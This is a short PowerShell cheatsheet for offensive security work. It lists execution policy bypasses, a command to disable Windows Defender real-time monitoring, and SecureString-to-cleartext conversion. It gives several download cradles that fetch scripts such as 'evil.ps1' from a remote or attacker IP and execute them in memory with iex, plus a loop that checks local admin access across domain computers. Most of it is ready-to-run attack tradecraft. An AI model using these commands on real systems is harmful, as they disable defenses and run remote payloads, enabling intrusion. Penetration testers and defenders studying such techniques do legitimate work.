# PowerShell Cheatsheet

## Common

PowerShell Execution Policy bypass:

```powershell
powershell –ExecutionPolicy bypass
powershell –c <cmd>
powershell –encodedcommand
$env:PSExecutionPolicyPreference="bypass"
```

\*Note: It is NOT a security measure, it is present to prevent user from accidentally executing scripts.

Check `LanguageMode` in current `ExecutionContenxt`:

```powershell
$ExecutionContext.SessionState.LanguageMode
```

Import a module:

```powershell
Import-Module <modulepath>
```

List commands in a module:

```powershell
Get-Command -Module <modulename>
```

List locally loaded functions:

```powershell
ls function: # Only on Windows
Get-Command -CommandType Function
```

Get function content:

```powershell
Get-Command <function name> | Select -ExpandProperty ScriptBlock
(Get-Command <function name>).ScriptBlock
$Function:<function name>
```

Disable Windows Defender real-time protection:

```powershell
Set-MpPreference -DisablerealtimeMonitoring $true
```

Escape single quote `'` in single quote `'` strings:
```powershell
 'this is''nt an emergency' # Double the '
```

Base64-encode a file:

```PowerShell
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(<file path>))
```

Base64-decode a string:

```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<base64 string>"))
```

Base64-encode a string:

```powershell
[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("<string>"))
```

Search files recursively:

```
Get-ChildItem -Path V:\Myfolder -Filter CopyForbuild.bat -Recurse -ErrorAction SilentlyContinue -Force
```

Get file hash:

```
Get-FileHash -Algorithm md5
```

Convert SecureString to cleartext string:

```powershell
(New-Object PSCredential 0, $secureString).GetNetworkCredential().Password

# Alternatively
[System.Net.NetworkCredential]::new("", $secureString).Password
```

## Remote File

Download remote script and execute it in memory:

```powershell
iex (New-Object Net.WebClient).DownloadString('https://<remote>/payload.ps1')

# Using Internet Explorer - doesn't always work
$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://<remote>/evil.ps1
');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

# From PowerShell v3 and onwards
iex (iwr 'http://<remote>/evil.ps1')
iex (iwr -UseBasicParsing http://<attacker ip>/evil.ps1)

# Using VBScript's Msxml2
$h=New-Object -ComObject
Msxml2.XMLHTTP;$h.open('GET','http://<remote>/evil.ps1',$false);$h.send();iex
$h.responseText

# Using .NET
$wr = [System.NET.WebRequest]::Create("http://<remote>/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()

```
## Loop

Loop on object:

```powershell
Get-NetComputer | select dnshostname | ForEach-Object -Process {Invoke-CheckLocalAdminAccess -ComputerName $_.dnshostname -Verbose}
```

